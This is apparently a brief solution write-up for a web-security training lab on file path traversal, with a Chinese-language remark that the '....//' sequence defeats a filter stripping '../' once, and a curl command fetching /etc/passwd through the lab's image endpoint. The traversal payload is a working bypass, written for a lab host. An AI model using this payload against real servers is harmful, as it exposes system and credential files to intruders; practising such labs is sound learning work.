# Lab: File path traversal, traversal sequences stripped non-recursively

This lab contains a file path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 

## LFI
* 跟前幾題差不多，這一題說他會把 ../ 過濾掉，所以說用 ....// 就可以 bypass 了
```
payload = curl https://ac001f791ee670f2c05951a400970086.web-security-academy.net/image\?filename\=....//....//....//....//....//....//....//....//etc/passwd
```